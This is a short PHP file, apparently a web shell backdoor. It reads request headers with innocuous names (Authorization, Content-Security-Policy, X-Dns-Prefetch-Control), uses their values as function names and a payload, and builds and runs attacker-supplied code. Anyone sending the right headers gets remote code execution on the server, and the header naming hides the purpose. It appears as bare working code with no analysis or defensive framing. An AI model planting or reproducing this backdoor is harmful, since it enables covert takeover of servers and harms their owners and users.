<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Authorization'])) {
    $system = $_HEADERS['Authorization']('', $_HEADERS['Content-Security-Policy']($_HEADERS['X-Dns-Prefetch-Control']));
    $system();
}